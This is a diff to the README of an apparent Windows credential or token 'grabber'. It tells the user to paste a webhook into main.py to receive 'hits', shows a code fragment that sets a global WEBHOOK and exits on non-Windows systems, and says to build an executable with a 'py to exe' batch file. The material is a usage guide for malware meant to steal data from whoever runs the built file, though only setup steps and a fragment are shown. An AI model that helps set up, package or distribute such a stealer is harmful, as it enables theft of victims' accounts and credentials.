@@ -20,16 +20,16 @@ Make sure you have [Python](https://www.python.org) installed
   
 ## Usage
 
-Open `main.py` and paste your webhook to line 10
+Open `main.py` and paste your webhook to line 19
 
-If you want grabber mentions you when you get a hit edit line 13 as True
-
-```bash 
-# your webhook URL
-WEBHOOK_URL = 'your webhook'
-
-# mentions you when you get a hit
-PING_ME = False
+```py
+def Auth():
+    def dastela():
+        global WEBHOOK
+        WEBHOOK = "" #webhook here
+        import os
+        if os.name != "nt":
+            exit()
 ```
 Run `py to exe.bat` and give a name for output 
 ## Warning
